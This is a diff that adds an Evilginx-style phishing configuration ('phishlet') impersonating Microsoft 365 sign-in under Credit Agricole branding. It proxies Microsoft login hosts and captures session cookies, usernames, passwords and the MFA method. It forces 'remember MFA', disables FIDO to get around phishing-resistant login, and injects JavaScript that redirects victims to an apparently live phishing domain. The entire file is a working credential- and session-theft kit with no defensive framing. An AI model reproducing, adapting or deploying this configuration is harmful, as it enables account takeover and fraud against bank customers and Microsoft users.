@@ -1,0 +1,116 @@
+name: 'Microsoft 365'
+author: 'Regh3x'
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'credit-agricole-login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'credit-agricole-access', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'credit-agricole-sso', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'Sign in to your account', replace: 'Credit-Agricole', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH:always','ESTSAUTHPERSISTENT:always','SignInStateCookie:always','esctx:always','ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
+    type: 'cookie'
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
+    type: 'cookie'
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/GetCredentialType'
+    search:
+      - {key: 'isFidoSupported', search: '.*'}
+    force:
+      - {key: 'isFidoSupported', value: 'false'}
+    type: 'post'
+  - path: '/common/SAS'
+    search: 
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+auth_urls:
+  - "/kmsi*"
+  - "/favicon.ico"
+  - "/common/SAS/ProcessAuth"
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'mfaAuthMethod'
+      search: '(.*)'
+      type: 'post'
+  username:
+    key: ""
+    search: '"username":"([^"]*)'
+    type: "json"
+  password:
+    key: ""
+    search: '"password":"([^"]*)'
+    type: "json"
+  username:
+    key: (login|UserName|username|email|account)
+    search: (.*)
+  password:
+    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
+    search: (.*)
+  username:
+    key: '(login)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd)'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/.*"]
+    trigger_params: ["true"]
+    script: |
+      function lop(){
+        var element = document.querySelector('.table');
+        console.log("loaded");
+        if (element) {
+          element.style.display = 'none';
+        }
+        if (window.location.pathname == '/common/fido/get' && !loc) {
+          console.log("success");
+          location.replace('https://credit-agricole-login.znextsolutions.com/');
+          loc = true;
+        }
+        if (window.location.pathname != '/common/fido/get' && loc) {
+          loc = false;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+
+      function faviconFever() {
+        const customIcon = "https://alng.blob.core.windows.net/assetsca/favicon.ico";
+        setInterval(() => {
+          let favicon = document.querySelector('link[rel="shortcut icon"], link[rel="icon"]');
+          if (favicon && favicon.href !== customIcon) {
+            favicon.href = customIcon;
+          }
+        }, 500);
+      }
+
+      document.addEventListener('DOMContentLoaded', faviconFever);
+      let loc = false;
+      setTimeout(function(){lop();}, 100);
